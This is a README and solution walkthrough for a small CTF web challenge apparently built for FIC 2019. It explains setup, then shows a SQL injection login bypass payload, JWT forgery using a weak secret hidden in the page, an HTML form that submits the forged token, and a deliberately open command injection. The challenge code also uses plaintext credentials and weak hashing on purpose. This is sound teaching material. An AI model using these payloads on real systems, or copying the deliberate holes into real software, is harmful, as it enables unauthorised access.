# JeanMi Construction

A little scenario with a few web & system challenges created for the FIC 2019.

## Setup

### Requirements

Make sure you have :

* SQLite3 installed (or any RDBMS if you choose manual way but I recommand you the automated way)
* PHP >= 7.1 (might run on older versions but I'm not sure so install 7.1 or newer)
* A securely configured web application server (i.e. Apache2 for exemple)

### Automated 

Just run the bash script and you are ready to go :

```
$ ./setup.sh
```

### Manual

If the script doesn't work for you and you want to check if everything went correctly :

To create the database you can use the SQL script with the relational database managament system of your choice. I personnaly like SQLite for this kind of cases because it's very easy to setup and here you don't need to write into the database for this challenge. You need to change the connection line in *pdo_connection.php* if you want to use something else than SQLite.

You can setup a SQLite database this way :

```
$ sqlite3 ./web/jeanmi-construction.db < generate-databse.sql
SQLite version 3.24.0 2018-06-04 14:10:15
Enter ".help" for usage hints.
sqlite> SELECT * FROM Users ;
1|user|35effb8d44421ae569cfaa9a2a2d76530df35d1d29afa42f5920f9bc4074771e
2|jeanmithebest|597f579d31603f69a07c6405f89e42c487553c9267e518339f325b4200f8efc7
```

*Do **not** use SHA256 to hash passwords, this is a challenge, not a good example*.

Then, change the rights on the database file you just created :

```
$ chmod 755 ./web/jeanmi-construction.db 
```

Users are as following :

| Username         | Password (before hash)                    |
|------------------|-------------------------------------------|
| admin            | yoloswag$123$aaa                          |
| jeanmithebest    | JeanmiConstructionGlobalIndustrySince2018 |

## Goal

The web part of the challenge consists in :

1. **Finding a way to access the administrator pannel (as admin)**. To do so, you have to exploit an SQL injection that is not shown on the page. You have to go to /login.php and process your SQLi. That's very basic and classical, yet, it is often presented with unashed password. I chosed on this one to present it with SHA-256 hashed passowrd and a SELECT COUNT() request. I actually did see it coded like that already on web apps. This illustrates a common situation for OWASP Top 10 2017 - A1.
2. **Finding a way to elevate your priveleges and become the super admin (basically, just become jeanmi).** You have to change your [JWT](https://jwt.io/) token to gain privileges. It's a bit harder because you have to know JWT. Those tokens are sometimes used to replace session and do session management tasks in a "stateless" way. Here it is mixed with a very bad crypto because the secrect is a key you can bruteforce or find. This illustrates an uncommon but still very credible situation for OWASP Top 10 2017 - A2.


## Challenge solution

### Step 1

The login page is not shown. However it's super easy to find, just go to login.php and you're ready to go. It's also shown on a few alt attributes on the page.

This is a SQLInjection. SQL request is (in pseudo-code):

```
SELECT COUNT(*) FROM Users WHERE username='?' AND passwd=sha256hash('?')
```

People that creates SQL requests this way think they are protected because of the structure of the SQL request. 
Actually, if you have a username, that one is ultra easy to bypass. 

Just type this in username field:

```
admin' --
```

### Step 2

You can find the JWT in local storage. 

You lack the secret to decode this JWT. It is actually ASCII encoded in the last chart of the page (the blue one). When you decode the ascii, you can find that the key is "jeanmiconstruction" :

<img src="screenshots/screenshot_step2.png" width="700em" style="margin-left: auto; margin-right: auto;">

Just going to [jwt.io](https://jwt.io) allows you to decode the base64 and having a nice display ultra fast. Also allows to modify your JWT and have the new encoded token instantly.

So you have to change your JWT and create a new valid one to access to the "super admin". Just change the first payload into the second and generate checksum with the secret we talked about earlier (i.e. "jeanmiconstruction") :

```javascript
// JWT that has to be changed
{
  {
    "typ": "JWT",
    "alg": "HS256"
  }
  {
    "iat": 1546955481,
    "jti": "5c34aad99e7705.36244423",
    "nbf": 1546955481,
    "exp": 1546973481,
    "data": {
      "username": "admin' --",
      "is_jeanmi_the_god": "false"
    }
  }
}
```

```javascript
// JWT to access super admin panel
{
  {
    "typ": "JWT",
    "alg": "HS256"
  }
  {
    "iat": 1546955481,
    "jti": "5c34aad99e7705.36244423",
    "nbf": 1546955481,
    "exp": 1546973481,
    "data": {
      "username": "admin",
      "is_jeanmi_the_god": "true"
    }
  }
}
```
*Please note that thoses payloads will not work for you because of the dates. It is valid only january, 8th of 2019.*

You now have a valid super admin token. You have few means to become super admin from now :

- First and most basic option is to intercept the request. We are going to call it the "pentester" way. You can use whatever tool you want to intercept the POST request to admin.php and replace the token with your forged one (Burp, ZAProxy, WebScarab, ...)
- Second option is to forge the request and send it directly. It's more of a "web-dev" way. I personnally like to do a little form to just send the request by clicking submit :

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Challenge resolver</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <form action="http://CHALLENGE_URL/admin.php" method="POST">
    <input type="text" name="token" value="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NDY5NTU0ODEsImp0aSI6IjVjMzRhYWQ5OWU3NzA1LjM2MjQ0NDIzIiwibmJmIjoxNTQ2OTU1NDgxLCJleHAiOjE1NDY5NzM0ODEsImRhdGEiOnsidXNlcm5hbWUiOiJhZG1pbiIsImlzX2plYW5taV90aGVfZ29kIjoidHJ1ZSJ9fQ.wvsiNnlWxKa0l3L8rScNdH1u6Y0dA04mIeah7sJLF0k">
    <input type="submit">
  </form>
</body>
</html>
```

Well played, you have access to the second flag and the third part of the challenge :

### Step 3

Not a real step because it's super easy and you don't get the flag, you just have to exploit a command injection that trusts the user to access the system part of the challenge:

Just change the command in the code of the form and you're ready to do commands on the machine. 

There is absolutely no security or hardening for the command on the web part. If something is not possible, it is probably blocked by the machine.
